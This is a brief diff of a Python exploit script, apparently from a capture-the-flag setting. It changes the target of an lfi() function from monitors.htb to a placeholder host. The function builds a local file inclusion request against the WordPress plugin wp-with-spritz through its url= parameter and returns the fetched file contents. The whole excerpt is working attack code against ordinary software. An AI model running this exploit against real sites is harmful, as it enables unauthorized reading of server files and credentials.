@@ -13,7 +13,7 @@ from datetime import datetime
 
 def lfi(filename): 
 	##Change this to your vulnerable URL
-	url = 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=' + filename
+	url = 'http://example_website.com/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=' + filename
 	r = requests.get(url)
 	response = r.content
 	return response
